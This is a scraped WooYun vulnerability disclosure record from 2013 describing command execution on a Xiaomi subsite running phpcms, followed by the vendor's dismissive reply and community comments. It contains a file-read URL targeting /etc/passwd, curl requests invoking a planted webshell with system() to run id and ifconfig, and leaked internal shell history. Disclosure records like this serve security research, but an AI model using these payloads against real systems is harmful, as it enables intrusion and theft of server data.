{"id": 8587, "wybug_id": "wooyun-2013-041385", "wybug_title": "一次小米未完成的内网渗透测试（仅测试可能性）", "wybug_corp": "小米科技", "wybug_author": "路人甲", "wybug_date": "2013-10-29 17:15", "wybug_open_date": "2013-10-30 10:36", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "第三方不可信程序", "代码执行", "补丁不及时"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 典型的一个分站业务导致的问题，本来想证明下业务架构和运维方面的问题，结果近期比较忙结果业务下线了，悲催！PS: 猜猜我是谁 详细说明：  www.xiaomi.cn使用phpcms搭建\nhttp://www.xiaomi.cn/api.php?op=ajax_domain&url=/etc/passwd\n\n\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  \ncurl http://www.xiaomi.cn/phpsso_server/1.php -d 'c=system($_REQUEST[d]);&d=id'uid=10000(work) gid=10000(work) groups=10000(work)\n\ncurl http://www.xiaomi.cn/phpsso_server/1.php -d 'c=system($_REQUEST[d]);&d=/sbin/ifconfig'eth0      Link encap:Ethernet  HWaddr 00:25:90:97:E5:14            inet addr:10.21.1.107  Bcast:10.21.1.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1903443069 errors:0 dropped:0 overruns:0 frame:0          TX packets:2863354900 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:987513424371 (919.6 GiB)  TX bytes:2483428852473 (2.2 TiB)          Memory:df980000-dfa00000\n \n#1377263539ls#1377263549vi /home/work/app/php/etc/php.ini #1377263569/home/work/app/php/run.sh restar#1377263571/home/work/app/php/run.sh restart#1377263708tail /home/work/logs/php/php_error.log #1377263752vi /home/work/app/php/etc/php.ini #1377263862/home/work/app/php/run.sh restart#1377264188vi /home/work/app/php/etc/php.ini #1377264319/home/work/app/php/run.sh restart#1377264540vi /home/work/www/api.xiaomi.cn/config/database.php #1377265088tail /home/work/logs/php/php_error.log #1377265097tail -100 /home/work/logs/php/php_error.log #1377265318curl -I -H \"host:api.xiaomi.cn\" http://127.0.0.1:8000/cms/category/getcategory/cat_id/6/num/10#1377265328curl -i -H \"host:api.xiaomi.cn\" http://127.0.0.1:8000/cms/category/getcategory/cat_id/6/num/10#1377265340ls#1377265342cd www/#1377265342\n   修复方案：  应用架构有问题（第三方的可有监控？）网络架构有问题（网络边界是否有隔离？）系统架构有问题（是否将运维和线上业务账号分离？）   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-30 10:36 厂商回复： 现在的“白帽子”是越来越看不懂了，以前一定是会报“小米网phpcms任意文件读取漏洞”。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-29 17:23 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  应该是 @猪猪侠    \n     2013-10-29 17:24 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  mark    \n     2013-10-29 17:37 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser 我的某个洞子在首页展现了，但是没有收到邀请链接，处理下啊！！！另外，卤煮，你也要换马甲了啊？    \n     2013-10-29 17:37 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  mark @猪猪侠    \n     2013-10-29 17:43 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  这标题风格一看就知道了    \n     2013-10-29 17:45 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @小胖子 我猜是dell的那个    \n     2013-10-29 17:51 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @寂寞的瘦子 NO!    \n     2013-10-29 17:59 |    \t\t盈盈无绪 \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:14        | 此人很懒)\t\t \n  mark    \n     2013-10-30 01:44 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  虽然老夫很抵制小米的操蛋售后，并呼吁周围人不要买小米。但是这次渗透和本人无关。    \n     2013-10-30 08:24 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  此站点已经废弃下线，感谢猪猪侠的精彩分析。    \n     2013-10-30 10:43 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @px1624 哈哈哈，你看厂商回复，厂商都在猜是谁了，怎么忽略了呢？    \n     2013-10-30 10:45 |    \t\tMr.Jen \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 开放自由)\t\t \n  小米生气 猜不出是谁 干脆忽略，叫你让我猜。。。    \n     2013-10-30 10:53 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  学习了    \n     2013-10-30 10:59 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  我去，为啥忽略了，搞不懂    \n     2013-10-30 11:16 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @带馅儿馒头 @小胖子 我也没看懂怎么忽略了。。哈哈 @xsser    \n     2013-10-30 11:31 |    \t\t请好心人解放我的左手 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 昨天，有一个女孩拒绝了我的爱意，第二天早...)\t\t \n  哈哈 已经被修复了    \n     2013-10-30 14:38 |    \t\tFallenAngel \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 啊喔呃咿呜喻。。0.0)\t\t \n  @猪猪侠 哈哈    \n     2013-10-30 14:53 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-10-30 15:17 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-10-30 15:43 |    \t\tFallenAngel \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 啊喔呃咿呜喻。。0.0)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-10-30 16:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  厂商的回复我怎么没看懂？谁翻译下，究竟要表达什么。。    \n     2013-10-30 16:17 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @疯狗 双引号用的nice。    \n     2013-10-30 18:34 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-10-30 22:39 |    \t\tEric \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 网络技术爱好者。)\t\t \n  @疯狗 现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-10-31 09:42 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子     \n     2013-10-31 10:03 |    \t\t请好心人解放我的左手 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 昨天，有一个女孩拒绝了我的爱意，第二天早...)\t\t \n  我小米社区刷了24W分 被封了，还说进去看看给解封了， 没想到这么快    \n     2013-10-31 10:18 |    \t\tx-star \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:13        | Windows/Linux Kernel.  Information Secur...)\t\t \n  @疯狗 厂商的意思是说 “不就是个PHPCMS任意文件读取漏洞吗？ 你写那么严重干嘛？ 谁让你写内网渗透的？  这下要挨领导打PP了。 ”    \n     2013-10-31 10:45 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @x-star 感谢解答厂商的意思，我是真没理解，现在明白了。厂商遇到问题可以沟通么，何必选择忽略漏洞呢？哎    \n     2013-11-06 20:14 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  看来是生气了。    \n     2013-11-10 12:29 |    \t\t何松 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | 你看)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2013-12-24 11:49 |    \t\twinsyk \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:16        | 越长大越孤单)\t\t \n  现在的厂商越来越看不懂了，官网都被人搞了还很牛的样子    \n     2014-03-29 03:27 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  作者的意思应该是 通过这些可以完成内网渗透 而厂商 觉得这仅仅是一个任意文件下载而已    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}